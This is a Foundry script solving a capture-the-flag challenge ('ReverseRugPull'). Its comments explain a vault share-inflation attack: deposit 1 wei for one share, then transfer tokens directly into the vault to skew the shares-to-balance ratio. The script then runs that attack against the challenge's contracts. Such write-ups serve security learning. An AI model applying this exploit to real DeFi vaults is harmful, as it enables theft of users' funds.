pragma solidity ^0.8.0;

import "forge-std/Script.sol";

import {IERC20} from "openzeppelin-contracts/contracts/token/ERC20/IERC20.sol";

interface IVault {
    function deposit(uint256 amount) external;

    function withdraw(uint256 sharesAmount) external;

    function owner() external view returns (address);

    function token() external view returns (IERC20);

    function shares(address) external view returns (uint256);

    function totalShares() external view returns (uint256);
}

// https://onlypwner.xyz/challenges/7
/*
in the withdraw function implementation, when owner withdraws the payout is doubled, this is how the owner of vautl rugpulls the users.
we need to make owner lose funds when they try to use this, so we need to attack on the payout amount calculation logic.

uint payoutAmount = (sharesAmount * currentBalance) / totalShares;
the shares are updated with deposit method, but if we directly deposit the erc20 tokens into vault the balance is updated and the shares amount is not.

hack: deposit 1 wei, get 1 share. then transfer large amount into vault directly. disturbs the shares/balance ratio as shares is not updated.
*/
contract ReverseRugPull is Script {
    function run() public {
        vm.startBroadcast();

        IVault vault = IVault(0x91B617B86BE27D57D8285400C5D5bAFA859dAF5F);
        IERC20 token = IERC20(0x78aC353a65d0d0AF48367c0A16eEE0fbBC00aC88);

        token.approve(address(vault), 1);
        vault.deposit(1);

        token.transfer(address(vault), token.balanceOf(msg.sender));
        vm.stopBroadcast();
    }
}
